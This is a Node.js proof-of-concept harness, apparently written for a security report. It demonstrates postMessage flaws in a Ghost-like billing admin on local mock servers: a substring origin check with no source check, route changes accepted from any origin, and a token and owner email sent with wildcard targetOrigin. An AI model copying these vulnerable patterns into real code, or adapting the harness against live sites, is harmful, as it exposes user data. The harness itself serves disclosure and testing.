#!/usr/bin/env node

import http from 'node:http';

const preferredMainPort = Number.parseInt(process.env.PORT || '7777', 10);
const runCli = process.argv.includes('--cli') || process.argv.includes('--self-test');

function runCliEvidence() {
    const billingUrl = 'https://billing.local.test/account';
    const billingFrameWindow = {
        id: 'billing-frame',
        messages: [],
        postMessage(data, targetOrigin) {
            this.messages.push({data, targetOrigin});
        }
    };
    const sameOriginNonBillingWindow = {id: 'same-billing-origin-not-the-billing-frame'};

    function handleBillingIframeMessage(event) {
        if (event?.data && billingUrl.includes(event?.origin)) {
            if (event.data?.request === 'forceUpgradeInfo') {
                billingFrameWindow.postMessage({
                    request: 'forceUpgradeInfo',
                    response: {
                        forceUpgrade: false,
                        isOwner: true,
                        ownerUser: {
                            name: 'Local Owner',
                            email: 'owner@example.test'
                        }
                    }
                }, '*');
            }
        }
    }

    const routeState = {
        hash: '#/pro',
        billingWindowOpen: true
    };

    function handleRouteChangeInIframe(destinationRoute) {
        if (routeState.billingWindowOpen) {
            let billingRoute = '#/pro';

            if (destinationRoute !== '/') {
                billingRoute += destinationRoute;
            }

            if (routeState.hash !== billingRoute) {
                routeState.hash = billingRoute;
            }
        }
    }

    handleBillingIframeMessage({
        origin: 'https://billing.local.test',
        source: sameOriginNonBillingWindow,
        data: {request: 'forceUpgradeInfo'}
    });

    const forceUpgradeMessage = billingFrameWindow.messages[0];

    console.log('LR-02 component accepted billing-origin message:', Boolean(forceUpgradeMessage));
    console.log('LR-02 event.source is real billing iframe:', sameOriginNonBillingWindow === billingFrameWindow);
    console.log('LR-02 forceUpgradeInfo targetOrigin:', forceUpgradeMessage.targetOrigin);
    console.log('LR-02 dummy owner email sent:', forceUpgradeMessage.data.response.ownerUser.email);

    console.log('LR-02 route before:', '#/pro');
    handleRouteChangeInIframe('/billing/plans');
    console.log('LR-02 route after cross-origin style message:', routeState.hash);

    billingFrameWindow.postMessage({
        query: 'limitUpdate'
    }, '*');

    const limitUpdateMessage = billingFrameWindow.messages.at(-1);
    console.log('LR-02 service outbound targetOrigin:', limitUpdateMessage.targetOrigin);
    console.log('LR-02 service outbound message:', JSON.stringify(limitUpdateMessage.data));
}

function sendHtml(res, html) {
    res.writeHead(200, {
        'content-type': 'text/html; charset=utf-8',
        'cache-control': 'no-store'
    });
    res.end(html);
}

function sendNotFound(res) {
    res.writeHead(404, {'content-type': 'text/plain; charset=utf-8'});
    res.end('Not found');
}

function listenAvailable(server, port) {
    return new Promise((resolve, reject) => {
        const tryPort = (candidate) => {
            server.once('error', (error) => {
                if (error.code === 'EADDRINUSE') {
                    tryPort(candidate + 1);
                    return;
                }

                reject(error);
            });

            server.listen(candidate, '127.0.0.1', () => {
                resolve(candidate);
            });
        };

        tryPort(port);
    });
}

function framePage(title, accent, script = '') {
    return `<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>${title}</title>
    <style>
        body { margin: 0; padding: 12px; font: 14px/1.45 system-ui, sans-serif; color: #1f2937; background: #fff; }
        h1 { margin: 0 0 8px; font-size: 15px; color: ${accent}; }
        button { margin: 0 6px 8px 0; padding: 6px 8px; }
        pre { margin: 0; min-height: 78px; padding: 8px; white-space: pre-wrap; word-break: break-word; border: 1px solid #d1d5db; background: #f9fafb; }
    </style>
</head>
<body>
    <h1>${title}</h1>
    <button id="token" hidden>request token</button>
    <button id="force" hidden>request forceUpgradeInfo</button>
    <button id="route" hidden>send route</button>
    <pre id="log">ready</pre>
    <script>
        const log = (message) => {
            document.getElementById('log').textContent += '\\n' + message;
            console.log('[${title}]', message);
        };

        window.addEventListener('message', (event) => {
            log('received from ' + event.origin + ' data=' + JSON.stringify(event.data));
        });

        ${script}
    </script>
</body>
</html>`;
}

function billingFramePage(adminOrigin) {
    return framePage('Billing iframe mock', '#2563eb', `
        document.getElementById('token').hidden = false;
        document.getElementById('force').hidden = false;

        function sendTokenRequest() {
            parent.postMessage({request: 'token'}, '${adminOrigin}');
            log('sent {request:"token"} to Admin parent');
        }

        function sendForceUpgradeRequest() {
            parent.postMessage({request: 'forceUpgradeInfo'}, '${adminOrigin}');
            log('sent {request:"forceUpgradeInfo"} to Admin parent');
        }

        document.getElementById('token').addEventListener('click', sendTokenRequest);
        document.getElementById('force').addEventListener('click', sendForceUpgradeRequest);

        window.addEventListener('message', (event) => {
            if (event.data?.command === 'requestToken') {
                sendTokenRequest();
            }

            if (event.data?.command === 'requestForceUpgradeInfo') {
                sendForceUpgradeRequest();
            }
        });
    `);
}

function sameBillingOriginSenderPage(adminOrigin) {
    return framePage('Same billing-origin non-billing frame', '#be123c', `
        document.getElementById('force').hidden = false;

        function sendForceUpgradeRequest() {
            parent.postMessage({request: 'forceUpgradeInfo'}, '${adminOrigin}');
            log('sent {request:"forceUpgradeInfo"} to Admin parent');
        }

        document.getElementById('force').addEventListener('click', sendForceUpgradeRequest);

        window.addEventListener('message', (event) => {
            if (event.data?.command === 'requestForceUpgradeInfo') {
                sendForceUpgradeRequest();
            }
        });
    `);
}

function routeSenderPage(route, adminOrigin) {
    return framePage('Cross-origin route sender', '#b45309', `
        document.getElementById('route').hidden = false;

        function sendRoute() {
            parent.postMessage({route: '${route}'}, '${adminOrigin}');
            log('sent {route:"${route}"} to Admin parent');
        }

        document.getElementById('route').addEventListener('click', sendRoute);

        window.addEventListener('message', (event) => {
            if (event.data?.command === 'sendRoute') {
                sendRoute();
            }
        });
    `);
}

function adminPage({billingOrigin, attackerOrigin}) {
    const billingUrl = `${billingOrigin}/billing.html`;

    return `<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>LR-02 Ghost Billing Harness</title>
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font: 14px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; color: #111827; background: #f3f4f6; }
        header { padding: 18px 22px; color: #fff; background: #111827; }
        h1 { margin: 0; font-size: 20px; font-weight: 650; }
        main { display: grid; gap: 16px; max-width: 1180px; margin: 0 auto; padding: 18px 22px 28px; }
        section { padding: 14px; border: 1px solid #d1d5db; border-radius: 8px; background: #fff; }
        h2 { margin: 0 0 10px; font-size: 16px; }
        p { margin: 0 0 10px; color: #4b5563; }
        button { margin: 0 8px 8px 0; padding: 8px 10px; border: 1px solid #9ca3af; border-radius: 6px; background: #fff; cursor: pointer; }
        button:hover { background: #f9fafb; }
        code { padding: 1px 4px; border-radius: 4px; color: #111827; background: #e5e7eb; }
        iframe { width: 100%; min-height: 150px; border: 1px solid #cbd5e1; border-radius: 6px; background: #fff; }
        pre { min-height: 190px; margin: 0; padding: 10px; overflow: auto; white-space: pre-wrap; word-break: break-word; color: #e5e7eb; border-radius: 6px; background: #0f172a; }
        .grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
        .state { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 10px; }
        .state span { padding: 4px 7px; border-radius: 999px; background: #e5e7eb; }
    </style>
</head>
<body>
    <header>
        <h1>LR-02 Ghost Billing postMessage Harness</h1>
    </header>
    <main>
        <section>
            <h2>Admin-like Controls</h2>
            <p>This mirrors the relevant Billing Admin behavior: configured billing URL, <code>billing-frame</code>, message listener, route listener, dummy owner data, and wildcard outbound messages. Ghost, Docker, database, and real billing are not started.</p>
            <button id="real-token">Real billing iframe requests token</button>
            <button id="same-origin-force">Non-billing frame on billing origin requests owner info</button>
            <button id="route">Cross-origin frame sends billing route</button>
            <button id="limit-update">Admin sends limitUpdate with wildcard</button>
            <button id="reset">Reset</button>
            <div class="state">
                <span id="hash-state">Admin hash: #/pro</span>
                <span id="billing-state">billingWindowOpen: true</span>
            </div>
            <pre id="log"></pre>
        </section>

        <section>
            <h2>Frames</h2>
            <div class="grid">
                <iframe id="billing-frame" title="billing iframe" src="${billingUrl}"></iframe>
                <iframe id="same-billing-origin-frame" title="same billing-origin sender" src="${billingOrigin}/same-billing-origin-sender.html"></iframe>
                <iframe id="cross-origin-route-frame" title="cross-origin route sender" src="${attackerOrigin}/route-sender.html"></iframe>
            </div>
        </section>
    </main>

    <script>
        const billingFrame = document.getElementById('billing-frame');
        const sameBillingOriginFrame = document.getElementById('same-billing-origin-frame');
        const crossOriginRouteFrame = document.getElementById('cross-origin-route-frame');
        const logEl = document.getElementById('log');
        const state = {
            hash: '#/pro',
            billingWindowOpen: true,
            isOwner: true,
            ownerUser: {
                name: 'Local Owner',
                email: 'owner@example.test'
            }
        };

        const billingUrl = '${billingUrl}';
        const dummyToken = 'dummy-local-identity-token';

        function log(message) {
            logEl.textContent += message + '\\n';
            logEl.scrollTop = logEl.scrollHeight;
            console.log('[lr-02]', message);
        }

        function renderState() {
            document.getElementById('hash-state').textContent = 'Admin hash: ' + state.hash;
            document.getElementById('billing-state').textContent = 'billingWindowOpen: ' + state.billingWindowOpen;
        }

        function reset() {
            state.hash = '#/pro';
            state.billingWindowOpen = true;
            logEl.textContent = '';
            renderState();
            log('ready');
            log('configured billing URL: ' + billingUrl);
        }

        function postToBillingFrame(message, reason) {
            billingFrame.contentWindow.postMessage(message, '*');
            log(reason + '; sent to billing-frame with targetOrigin="*"');
        }

        function handleNoPermission() {
            state.isOwner = false;
            postToBillingFrame({request: 'token', response: null}, 'handled token request without owner permission');
        }

        function handleTokenRequest() {
            if (!state.isOwner) {
                handleNoPermission();
                return;
            }

            postToBillingFrame({request: 'token', response: dummyToken}, 'handled token request');
        }

        function handleForceUpgradeRequest() {
            postToBillingFrame({
                request: 'forceUpgradeInfo',
                response: {
                    forceUpgrade: false,
                    isOwner: state.isOwner,
                    ownerUser: state.ownerUser
                }
            }, 'handled forceUpgradeInfo request with dummy owner email ' + state.ownerUser.email);
        }

        function handleBillingIframeMessage(event) {
            if (event?.data && billingUrl.includes(event?.origin)) {
                log('component accepted message from origin ' + event.origin + '; source is billing-frame: ' + (event.source === billingFrame.contentWindow));

                if (event.data?.request === 'token') {
                    handleTokenRequest();
                }

                if (event.data?.request === 'forceUpgradeInfo') {
                    handleForceUpgradeRequest();
                }
            }
        }

        function handleRouteChangeInIframe(destinationRoute) {
            if (state.billingWindowOpen) {
                let billingRoute = '#/pro';

                if (destinationRoute !== '/') {
                    billingRoute += destinationRoute;
                }

                if (state.hash !== billingRoute) {
                    state.hash = billingRoute;
                    renderState();
                    log('billing service accepted route without origin/source check; hash changed to ' + billingRoute);
                }
            }
        }

        window.addEventListener('message', (event) => {
            handleBillingIframeMessage(event);

            if (event && event.data && event.data.route) {
                log('route message arrived from ' + event.origin + ' data=' + JSON.stringify(event.data));
                handleRouteChangeInIframe(event.data.route);
            }
        });

        document.getElementById('real-token').addEventListener('click', () => {
            billingFrame.contentWindow.postMessage({command: 'requestToken'}, '${billingOrigin}');
            log('asked real billing iframe to request token');
        });

        document.getElementById('same-origin-force').addEventListener('click', () => {
            sameBillingOriginFrame.contentWindow.postMessage({command: 'requestForceUpgradeInfo'}, '${billingOrigin}');
            log('asked non-billing frame on billing origin to request forceUpgradeInfo');
        });

        document.getElementById('route').addEventListener('click', () => {
            crossOriginRouteFrame.contentWindow.postMessage({command: 'sendRoute'}, '${attackerOrigin}');
            log('asked cross-origin frame to send {route:"/billing/plans"}');
        });

        document.getElementById('limit-update').addEventListener('click', () => {
            postToBillingFrame({query: 'limitUpdate'}, 'billing service sendUpdateLimits');
        });

        document.getElementById('reset').addEventListener('click', reset);

        reset();
    </script>
</body>
</html>`;
}

async function runBrowserHarness() {
    let mainPort;
    let billingPort;
    let attackerPort;

    const mainServer = http.createServer((req, res) => {
        const url = new URL(req.url, `http://127.0.0.1:${mainPort}`);

        if (url.pathname === '/') {
            sendHtml(res, adminPage({
                billingOrigin: `http://127.0.0.1:${billingPort}`,
                attackerOrigin: `http://127.0.0.1:${attackerPort}`
            }));
            return;
        }

        sendNotFound(res);
    });

    const billingServer = http.createServer((req, res) => {
        const url = new URL(req.url, `http://127.0.0.1:${billingPort}`);
        const adminOrigin = `http://127.0.0.1:${mainPort}`;

        if (url.pathname === '/billing.html' || url.pathname === '/') {
            sendHtml(res, billingFramePage(adminOrigin));
            return;
        }

        if (url.pathname === '/same-billing-origin-sender.html') {
            sendHtml(res, sameBillingOriginSenderPage(adminOrigin));
            return;
        }

        sendNotFound(res);
    });

    const attackerServer = http.createServer((req, res) => {
        const url = new URL(req.url, `http://127.0.0.1:${attackerPort}`);
        const adminOrigin = `http://127.0.0.1:${mainPort}`;

        if (url.pathname === '/route-sender.html' || url.pathname === '/') {
            sendHtml(res, routeSenderPage('/billing/plans', adminOrigin));
            return;
        }

        sendNotFound(res);
    });

    mainPort = await listenAvailable(mainServer, preferredMainPort);
    billingPort = await listenAvailable(billingServer, mainPort + 1);
    attackerPort = await listenAvailable(attackerServer, billingPort + 1);

    console.log(`LR-02 Ghost-like billing harness: http://127.0.0.1:${mainPort}/`);
    console.log(`Billing mock origin: http://127.0.0.1:${billingPort}/billing.html`);
    console.log(`Cross-origin route sender: http://127.0.0.1:${attackerPort}/route-sender.html`);
    console.log('Press Ctrl+C to stop.');
}

if (runCli) {
    runCliEvidence();
} else {
    await runBrowserHarness();
}
